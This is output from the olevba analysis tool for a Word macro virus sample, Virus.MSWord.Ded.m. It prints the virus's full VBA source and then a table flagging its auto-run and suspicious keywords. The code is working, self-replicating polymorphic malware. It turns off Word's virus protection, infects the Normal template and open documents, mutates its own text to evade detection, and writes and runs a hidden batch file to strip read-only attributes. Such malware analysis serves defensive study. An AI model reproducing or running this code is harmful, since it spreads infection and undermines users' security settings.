olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ded.m-e8e5144ec9110f44a996e2609696491a93738d1d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ded.m-e8e5144ec9110f44a996e2609696491a93738d1d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
            Private Sub _
Document_Close()

         On Error GoTo _
skam

    Options.VirusProtection _
= False

    SWL
'40,13744
          ABS99
'41,27668
skam:
'58,3359
         End Sub
'91,93771
   Private Sub Èäåíòèôèêàòîð()
'47,44592
 End Sub
'39,04715
           Private Sub Document_New()
'8,964139
  End Sub
'58,97926
    Sub Claudio()
'79,01289
           On Error _
GoTo skam

  Options.VirusProtection = False
'69,52818
        SWL
'81,46639
          ABS99
'48,98304
skam:
'15,03113
           End Sub
'68,40623
        Private Sub SWL()
'53,30223
      Application. _
                                        ShowVisualBasicEditor = False

      If Not ActiveDocument.VBProject. _
 VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then

      For I = 1 To NormalTemplate. _
 VBProject.VBComponents(1).CodeModule.CountOfLines

             d = NormalTemplate. _
  VBProject.VBComponents(1).CodeModule.Lines(I, 1)

     If Len(d) > 0 And _
Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then

       While Mid(d, Len(d) - _
1, 2) = " _"

   I _
= I + 1

             d = _
Left(d, Len(d) - 1) & NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(I, 1)

       Wend
'44,12162
 d = e(d)
'61,98315
  ActiveDocument. _
          VBProject.VBComponents(1).CodeModule.InsertLines I * 2, d

End If
'25,779
        Next _
I

            ActiveDocument. _
                                         SaveAs AddToRecentFiles:=False

          End If
'33,90907
        End _
Sub

          Private _
Sub ABS99()

           If Not _
NormalTemplate.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then

        f (NormalTemplate.FullName)
'98,46497
        For I = _
1 To ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines

d = _
ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(I, 1)

        If _
Len(d) > 0 And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then

While Mid(d, Len(d) - _
1, 2) = " _"

I = I + 1
'4,03102
           d = _
Left(d, Len(d) - 1) & ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(I, 1)

        Wend
'40,87609
         d _
= e(d)

           NormalTemplate. _
        VBProject.VBComponents(1).CodeModule.InsertLines I * 2, d

     End If
'22,2532
  Next _
I

             NormalTemplate. _
                         Save

           End If
'41,19965
    End Sub
'97,89316
              Private Function _
e(aString) As String

           aString _
= LTrim(aString)

              aString = _
RTrim(aString)

If _
aString = "Sub " & "Vc()" Then

          aString _
= "Sub " & "ViewVBCode()"

   Else
'70,0834
   If aString = "Sub " & "ViewVBCode()" Then
'15,3209
          aString = "Sub " & "Vc()"
'26,81322
             End If
'73,11366
      End If
'65,09283
    For I = 1 _
To Len(aString) - 1

         If _
Mid(aString, I, 1) = "." Then

    If Not _
Mid(aString, I - 1, 1) = Chr$(34) And Not Mid(aString, I + 1, 1) = Chr$(34) And Int(3 * Rnd) = 1 Then

          If _
Not Mid(aString, I + 1, 1) = Chr$(34) Then

        e _
= Left(aString, I - 1) & ". _" & Chr$(13) & Right(aString, Len(aString) - I)

         For j _
= 1 To Int(15 * Rnd)

 e _
= " " & e

           Next j
'65,09658
Exit _
Function

    End If
'60,4323
      End _
If

     Else
'50,60932
            If Mid(aString, I, 1) _
= " " And Int(3 * Rnd) = 1 And I > 1 Then

    If Not Mid(aString, I + 1, _
1) = Chr$(34) And Not Mid(aString, I - 1, 1) = Chr$(34) Then

       e _
= Left(aString, I - 1) & " _" & Chr$(13) & Right(aString, Len(aString) - I)

          For j = _
1 To Int(15 * Rnd)

        e = " " & e
'5,125594
   Next _
j

             Exit Function
'5,668926
       End _
If

        End If
'75,60766
      End _
If

    Next I
'97,05891
             e = aString _
& Chr$(13) & "'" & (100 * Rnd)

             Count = _
Int(15 * Rnd)

           For _
j = 1 To Count

           e = " " & e
'44,68451
           Next j
'80,95902
   End Function
'21,31246
    Private _
Sub f(fName)

            If GetAttr(fName) _
And vbReadOnly Then

        Open Dir(fName) & ".bat" For _
Append As #1

            Print #1, "Attrib " & "-r " & Chr$(34) & fName & Chr$(34)
'8,693462
      Print _
#1, "del " & Chr$(34) & Dir(fName) & ".bat" & Chr$(34)

              Close #1
'0,3313601
              shellResult = Shell(Dir(fName) & ".bat", vbHide)
'83,53419
             End If
'49,27979
          End Sub
'49,07289
           Sub Vc()
'28,75566
     For aDoc = 1 _
To Documents.Count

             For I = 1 _
To Documents(aDoc).VBProject.VBComponents(1).CodeModule.CountOfLines

       Documents(aDoc). _
VBProject.VBComponents(1).CodeModule.DeleteLines 1

       Next I
'58,09404
            Next aDoc
'98,89729
 For I _
= 1 To NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines

 NormalTemplate.VBProject.VBComponents(1).CodeModule. _
DeleteLines 1

    Next I
'71,17095
           Application. _
ShowVisualBasicEditor = True

             End Sub
'16,08505
         Private Sub Document_Open()
'9,908933
         End _
Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

